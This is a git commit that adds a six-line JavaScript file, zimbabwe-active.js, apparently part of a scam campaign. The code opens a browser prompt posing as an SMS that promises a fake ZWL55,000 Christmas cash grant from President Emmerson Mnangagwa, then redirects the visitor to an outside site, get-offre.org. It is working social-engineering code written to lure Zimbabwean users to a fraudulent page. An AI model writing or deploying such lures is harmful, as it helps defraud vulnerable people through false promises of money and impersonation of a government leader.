54adbe96f6255af1e7071d0c8da1d5dce302a315
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-24 02:16:34 -0800

    Create zimbabwe-active.js

---
+++ zimbabwe-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW ZWL55,000'
+password=prompt('SMS: Congratulations You are qualify for President EMMERSON MNANGAWA ZWL55,000 CHRISTMAS CASH GRANT FOR ZIMBABWEANS, Kindly Press OK to Withdraw Cash Prize','WITHDRAW ZWL55,000');
+if (password != 'WITHDRAW ZWL55,000') {
+location.href='https://get-offre.org/zimbabwe-grant.html';
+}
